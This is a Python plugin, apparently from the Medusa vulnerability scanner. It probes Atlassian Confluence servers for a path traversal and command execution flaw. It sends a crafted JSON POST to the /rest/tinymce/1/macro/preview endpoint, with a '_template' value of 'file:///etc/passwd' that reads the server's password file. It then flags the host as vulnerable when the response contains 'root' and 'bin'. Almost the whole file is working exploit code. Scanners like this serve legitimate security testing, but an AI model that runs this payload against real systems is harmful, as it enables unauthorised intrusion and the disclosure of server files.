#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import urllib.parse
import logging
import requests
import ClassCongregation


class VulnerabilityInfo(object):
    def __init__(self, Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "AtlassianConfluencePathTraversal_and_CommandExecutionVulnerability"  # 插件名称
        self.info['name'] = 'AtlassianConfluence路径穿越与命令执行漏洞'  # 漏洞名称
        self.info['affects'] = "Confluence"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果


def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

PayloadPost='''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}'''
Payload="/rest/tinymce/1/macro/preview"
def medusa(Url,RandomAgent,ProxyIp):
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    PayloadUrl = scheme+"://"+url+':'+str(port)+Payload
    Referers = scheme + "://" + url + ':' + str(port)
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept': 'text/plain, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'User-Agent': RandomAgent,
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json; charset=utf-8',
        'Referer': Referers,
        'Content-Length': '167',
        'X-Forwarded-For': '127.0.0.2',
        'Connection': 'keep-alive'

    }
    s = requests.session()
    try:
        # if ProxyIp!=None:#判断是否需要代理访问
        #     proxies = {
        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
        #         "http": "http://" + str(ProxyIp)
        #     }
        #     resp = s.post(PayloadUrl,data=PayloadPost,proxies=proxies,headers=headers, timeout=5)
        # elif ProxyIp==None:
        resp = s.post(PayloadUrl, data=PayloadPost, headers=headers, timeout=5)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('bin')!=-1 and con.lower().find('root')!=-1 :
            Medusa = "{}存在AtlassianConfluence路径穿越与命令执行漏洞 \r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, PayloadUrl,PayloadPost)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (str(_t.info))
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l=ClassCongregation.ErrorLog().Write(url,_)#调用写入类